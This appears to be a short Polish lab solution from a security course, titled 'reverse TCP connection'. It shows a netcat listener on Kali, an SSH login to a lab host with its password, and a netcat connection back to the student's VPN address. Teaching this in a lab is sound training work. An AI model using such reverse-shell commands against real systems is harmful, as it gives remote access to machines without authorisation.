---
title: "6.1 - Połączenie reverse TCP"
order: 1
---

> **Uwaga do rozwiązania:** Adres `[IP_STUDENTA]` to Twój adres interfejsu VPN, zwykle `tun0`. W tej sekcji komentarze Kali / Remote Shells wskazują miejsce wykonania.

```bash
#Kali - check your VPN IP (tun0):
ip addr show tun0
#inet [IP_STUDENTA] peer 10.65.0.5/32 scope global tun0
nc -lvp 12301

#Second terminal (Kali -> Remote Shells HOMEWORK):
ssh student@192.168.100.106 #Password: pjatk
nc [IP_STUDENTA] 12301 #Replace [IP_STUDENTA] with your VPN IP
```
